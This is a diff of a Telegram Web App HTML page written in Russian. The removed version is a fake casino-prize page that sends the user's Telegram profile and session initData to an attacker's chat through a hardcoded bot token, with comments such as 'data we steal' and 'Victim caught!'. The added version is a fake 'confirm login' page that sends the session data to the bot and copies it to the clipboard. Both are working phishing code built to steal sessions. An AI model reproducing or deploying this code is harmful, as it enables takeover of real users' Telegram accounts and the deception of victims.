@@ -1,84 +1,46 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Casino Royal</title>
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <title>Подтверждение</title>
     <style>
-        body {
-            background: linear-gradient(135deg, #1a1a2e, #16213e);
-            color: white;
-            font-family: Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .casino-box {
-            background: #0f3460;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 0 15px rgba(233, 46, 60, 0.5);
-            text-align: center;
-            width: 80%;
-        }
-        button {
-            background: #e94560;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            font-size: 18px;
-            border-radius: 10px;
-            cursor: pointer;
-            margin-top: 20px;
-        }
-        .loading { display: none; margin-top: 10px; color: #ffd700; }
+        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); text-align: center; }
+        button { background: #3390ec; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; margin-top: 10px; }
+        button:disabled { background: #ccc; }
     </style>
 </head>
 <body>
+    <div class="card">
+        <h2>Подтвердите вход</h2>
+        <p>Нажмите кнопку, чтобы активировать аккаунт.</p>
+        <button id="authBtn">Подтвердить</button>
+        <div id="result" style="margin-top: 10px; font-size: 12px; word-break: break-all; color: #555;"></div>
+    </div>
 
-<div class="casino-box">
-    <h2>🎰 Lucky Spin 🎰</h2>
-    <p>Твой приз: 10,000 монет!</p>
-    <button id="claimBtn">Забрать приз</button>
-    <div id="loader" class="loading">Обработка...</div>
-</div>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <script>
+        const tg = window.Telegram.WebApp;
+        const btn = document.getElementById('authBtn');
+        const result = document.getElementById('result');
 
-<script>
-    const tg = window.Telegram.WebApp;
-    tg.expand();
-
-    // ВСТАВЬ СЮДА ДАННЫЕ
-    const BOT_TOKEN = '8884810650:AAF6Cd8PJASq0-kbqPkO_LnH5KtiGGjZjVw'; 
-    const YOUR_CHAT_ID = '8658887417'; 
-
-    document.getElementById('claimBtn').onclick = function() {
-        document.getElementById('loader').style.display = 'block';
-        this.disabled = true;
-
-        // Данные, которые мы крадем
-        const userData = tg.initDataUnsafe.user;
-        const session = tg.initData;
-
-        // Отправляем данные тебе через API Telegram
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: YOUR_CHAT_ID,
-                text: `🎣 Жертва поймана!\n\nID: ${userData.id}\nUsername: ${userData.username || 'N/A'}\nName: ${userData.first_name} ${userData.last_name || ''}\n\nSession: ${session}`
-            })
-        }).then(() => {
-            document.getElementById('loader').innerText = "Приз отправлен!";
-        }).catch(err => {
-            document.getElementById('loader').innerText = "Ошибка отправки";
-            console.error(err);
-        });
-    };
-</script>
-
+        btn.onclick = () => {
+            btn.disabled = true;
+            btn.innerText = "Загрузка...";
+            
+            // Отправляем данные боту
+            tg.sendData(tg.initData); 
+            // initData содержит query_id, user, auth_date и hash
+            
+            result.innerText = tg.initData;
+            
+            // Для удобства копирования (если бот не получит данные)
+            setTimeout(() => {
+                navigator.clipboard.writeText(tg.initData);
+                result.innerText += "\n\nСкопировано в буфер обмена!";
+            }, 1000);
+        };
+    </script>
 </body>
 </html>
